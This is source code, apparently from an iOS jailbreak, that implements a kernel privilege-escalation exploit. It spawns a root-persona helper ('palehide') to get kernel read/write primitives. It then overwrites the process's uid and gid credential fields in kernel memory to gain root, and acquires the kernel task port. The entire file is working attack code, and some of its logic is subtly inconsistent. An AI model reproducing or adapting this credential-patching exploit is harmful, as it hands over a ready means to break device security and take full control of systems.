#include <stdio.h>

#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <libjailbreak/libjailbreak.h>

#include <spawn.h>
#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
extern int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
extern int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);

extern char**environ;

int inPipe[2];
int outPipe[2];
pid_t serverPid;

#define SYSLOG(fmt, ...) NSLog(@(fmt), ##__VA_ARGS__)
int spawn_server(const char* path, const char** argv, const char** envp)
{
    SYSLOG("spawn %s", path);
    for(int i=0; argv[i]; i++) {
        SYSLOG("argv[%d] %s", i, argv[i]);
    }
    
    __block pid_t pid=0;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    
    posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
    posix_spawnattr_set_persona_uid_np(&attr, 0);
    posix_spawnattr_set_persona_gid_np(&attr, 0);

    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);
    
    pipe(inPipe);
    posix_spawn_file_actions_addclose(&action, inPipe[1]);
    posix_spawn_file_actions_adddup2(&action, inPipe[0], STDIN_FILENO);
    posix_spawn_file_actions_addclose(&action, inPipe[0]);
    
    pipe(outPipe);
    posix_spawn_file_actions_addclose(&action, outPipe[0]);
    posix_spawn_file_actions_adddup2(&action, outPipe[1], STDOUT_FILENO);
    posix_spawn_file_actions_addclose(&action, outPipe[1]);
    
    int errPipe[2];
    pipe(errPipe);
    posix_spawn_file_actions_addclose(&action, errPipe[0]);
    posix_spawn_file_actions_adddup2(&action, errPipe[1], STDERR_FILENO);
    posix_spawn_file_actions_addclose(&action, errPipe[1]);
    
    int spawnError = posix_spawn(&serverPid, path, &action, &attr, argv, envp);
    SYSLOG("spawn ret=%d, pid=%d", spawnError, pid);
    
    posix_spawnattr_destroy(&attr);
    posix_spawn_file_actions_destroy(&action);
    
    close(inPipe[0]);
    close(outPipe[1]);
    close(errPipe[1]);
    
    return spawnError;
    
    if(spawnError != 0)
    {
        SYSLOG("posix_spawn error %d:%s\n", spawnError, strerror(spawnError));
        return spawnError;
    }
    
    return 0;
}

enum SERVER_CMD {
    GET_KBASE=1,
    KREAD_BUF,
    KWRITE_BUF,
    EXIT_SERVER,
};

int stop_server()
{
    uint32_t cmd = EXIT_SERVER;
    write(inPipe[1], &cmd, sizeof(cmd));
    
    int status=0;
    while(waitpid(serverPid, &status, 0) != -1)
    {
        if (WIFSIGNALED(status)) {
            return 128 + WTERMSIG(status);
        } else if (WIFEXITED(status)) {
            return WEXITSTATUS(status);
        }
        //keep waiting?return status;
    };
    return -1;
}

uint64_t getkbase()
{
    uint32_t cmd = GET_KBASE;
    write(inPipe[1], &cmd, sizeof(cmd));
    
    uint64_t kbase=0;
    read(outPipe[0], &kbase, sizeof(kbase));
    
    return kbase;
}

int temp_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint32_t cmd = KREAD_BUF;
    write(inPipe[1], &cmd, sizeof(cmd));
    
    write(inPipe[1], &kaddr, sizeof(kaddr));
    write(inPipe[1], &size, sizeof(size));
    
    read(outPipe[0], output, size);
    
    int ret=0;
    read(outPipe[0], &ret, sizeof(ret));
    
    return ret;
}

int temp_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    uint32_t cmd = KWRITE_BUF;
    write(inPipe[1], &cmd, sizeof(cmd));
    
    write(inPipe[1], &kaddr, sizeof(kaddr));
    write(inPipe[1], &size, sizeof(size));
    write(inPipe[1], input, size);
    
    int ret=0;
    read(outPipe[0], &ret, sizeof(ret));
    
    return ret;
}

mach_port_t tfp0 = 0;

extern kern_return_t mach_vm_read_overwrite(task_t task, mach_vm_address_t addr, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_write(task_t task, mach_vm_address_t addr, mach_vm_address_t data, mach_msg_type_number_t dataCnt);

int tfp0_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    mach_vm_size_t read;
    return mach_vm_read_overwrite(tfp0, kaddr, size, (mach_vm_address_t)output, &read);
}

int tfp0_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    return mach_vm_write(tfp0, kaddr, (mach_vm_address_t)input, (mach_msg_type_number_t)size);
}

int exploit_init(const char *flavor)
{
    char*const args[] = {"palehide", "server", NULL};
    spawn_server("/var/containers/Bundle/palehide", args, environ);
    
    uint64_t kernelbase = getkbase();
    NSLog(@"kbase=%llx", kernelbase);
    
    gPrimitives.kwritebuf = temp_kwritebuf;
    gPrimitives.kreadbuf = temp_kreadbuf;
    gSystemInfo.kernelConstant.slide = kernelbase - kconstant(staticBase);
    
    NSLog(@"magic=%x", kread32(kernelbase));
    NSLog(@"kallproc=%llx", ksymbol(allproc));
    NSLog(@"allproc=%llx", kread64(ksymbol(allproc)));
    NSLog(@"launchd proc=%llx", proc_find(1));
    
    uint64_t proc = proc_self();
    NSLog(@"proc=%llx", proc);
    uint64_t ucred = proc_ucred(proc);
    NSLog(@"ucred=%llx", ucred);
    
    // Get uid 0
    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);
    
    // Get gid 0
    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);
    
    // Add P_SUGID
    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }
    
    stop_server();
    
    assert(getuid() == 0);
    assert(getgid() == 0);
    
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &tfp0);
    NSLog(@"kr=%d(%s), tfp0=%x\n", kr, mach_error_string(kr), tfp0);
    assert(kr == KERN_SUCCESS);
    
    gPrimitives.kwritebuf = tfp0_kwritebuf;
    gPrimitives.kreadbuf = tfp0_kreadbuf;
    
    return 0;
}

int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == tfp0_kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == tfp0_kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    return 0;
}
